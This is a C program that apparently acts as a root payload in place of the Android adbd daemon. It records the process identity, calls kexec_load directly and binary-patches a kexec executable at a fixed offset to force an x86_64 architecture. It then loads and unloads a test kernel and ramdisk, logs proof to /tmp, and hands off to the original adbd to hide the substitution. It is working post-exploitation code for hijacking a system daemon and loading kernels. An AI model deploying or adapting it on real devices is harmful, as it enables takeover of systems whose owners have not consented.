#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#define KEXEC   "/tmp/p90-kexec"
#define KERNEL  "/tmp/p90-kexec-test-bzImage"
#define INITRD   "/tmp/p90-rescue-ramdisk.img"
#define STATUS  "/tmp/p90-kexec-proof.txt"
#define RESULT_ADBD "/tmp/p90-original-adbd"
#define KEXEC_PHYSICAL_ARCH_FILE_OFFSET 0xa1c0
#define KEXEC_ARCH_X86_64 (62UL << 16)

#ifndef __NR_kexec_load
#define __NR_kexec_load 283
#endif

static int force_kexec_physical_arch_x86_64(int status)
{
    static const unsigned char expected[] = {0x55, 0x57, 0x56, 0x53};
    static const unsigned char replacement[] = {
        0xb8, 0x00, 0x00, 0x3e, 0x00, /* mov $0x003e0000,%eax */
        0xc3                          /* ret */
    };
    unsigned char actual[sizeof(expected)];
    int fd = open(KEXEC, O_RDWR);

    if (fd < 0) {
        dprintf(status, "patch open errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }
    if (pread(fd, actual, sizeof(actual), KEXEC_PHYSICAL_ARCH_FILE_OFFSET) !=
            (ssize_t)sizeof(actual) ||
        memcmp(actual, expected, sizeof(expected)) != 0) {
        dprintf(status, "patch refused: physical_arch prefix mismatch\n");
        close(fd);
        return -1;
    }
    if (pwrite(fd, replacement, sizeof(replacement),
               KEXEC_PHYSICAL_ARCH_FILE_OFFSET) !=
            (ssize_t)sizeof(replacement)) {
        dprintf(status, "patch write errno=%d (%s)\n", errno, strerror(errno));
        close(fd);
        return -1;
    }
    fsync(fd);
    close(fd);
    dprintf(status, "patched physical_arch=KEXEC_ARCH_X86_64\n");
    return 0;
}

static int run_and_record(int status, const char *label, char *const argv[])
{
    pid_t child = fork();
    int wait_status = 0;

    if (child == 0) {
        dup2(status, STDOUT_FILENO);
        dup2(status, STDERR_FILENO);
        execv(KEXEC, argv);
        dprintf(status, "%s exec errno=%d (%s)\n",
                label, errno, strerror(errno));
        _exit(127);
    }
    if (child < 0) {
        dprintf(status, "%s fork errno=%d (%s)\n",
                label, errno, strerror(errno));
        return -1;
    }
    if (waitpid(child, &wait_status, 0) != child) {
        dprintf(status, "%s wait errno=%d (%s)\n",
                label, errno, strerror(errno));
        return -1;
    }
    if (WIFEXITED(wait_status)) {
        dprintf(status, "%s exit=%d\n", label, WEXITSTATUS(wait_status));
        return WEXITSTATUS(wait_status);
    }
    dprintf(status, "%s abnormal_status=%d\n", label, wait_status);
    return -1;
}

int main(void)
{
    int status = open(STATUS, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    int load_result = -1;
    int unload_result = -1;
    long direct_result;
    struct utsname uts;
    char *load_argv[] = {
        KEXEC, "--load", KERNEL, "--type=bzImage",
        "--initrd=" INITRD, "--reuse-cmdline",
        NULL
    };
    char *unload_argv[] = {KEXEC, "--unload", NULL};
    char *adbd_argv[] = {RESULT_ADBD, NULL};

    if (status >= 0) {
        dprintf(status, "uid=%d gid=%d euid=%d egid=%d\n",
                getuid(), getgid(), geteuid(), getegid());
        if (uname(&uts) == 0)
            dprintf(status, "uname.machine=%s\n", uts.machine);
        if (geteuid() == 0) {
            errno = 0;
            direct_result = syscall(__NR_kexec_load, 0UL, 0UL, 0UL,
                                    KEXEC_ARCH_X86_64);
            dprintf(status,
                    "direct_x86_64_zero result=%ld errno=%d (%s)\n",
                    direct_result, errno, strerror(errno));
            if (chmod(KEXEC, 0755) != 0) {
                dprintf(status, "chmod kexec errno=%d (%s)\n",
                        errno, strerror(errno));
            } else if (force_kexec_physical_arch_x86_64(status) == 0) {
                load_result = run_and_record(status, "load", load_argv);
                unload_result = run_and_record(status, "unload", unload_argv);
            }
        } else {
            dprintf(status, "refusing: agent is not root\n");
        }
        dprintf(status, "complete=1 load_result=%d unload_result=%d\n",
                load_result, unload_result);
        fsync(status);
        fchmod(status, 0644);
        close(status);
    }

    chmod(RESULT_ADBD, 0755);
    execv(RESULT_ADBD, adbd_argv);
    return 127;
}
